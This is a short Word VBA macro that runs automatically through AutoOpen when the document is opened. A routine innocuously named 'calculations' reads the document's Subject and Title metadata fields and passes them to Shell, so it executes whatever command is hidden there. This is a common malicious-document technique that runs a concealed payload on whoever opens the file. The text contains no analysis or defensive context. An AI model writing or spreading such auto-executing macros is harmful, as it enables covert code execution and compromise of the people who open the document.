Sub AutoOpen()
    calculations
End Sub

Sub calculations()
    
   Dim strProgramName As String
   Dim strProgramNamex As String
   Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties("Subject").Value
    strProgramNamex = doc.BuiltInDocumentProperties("Title").Value
    Call Shell("""" & strProgramName & """" & " " & strProgramNamex, vbNormalFocus)
End Sub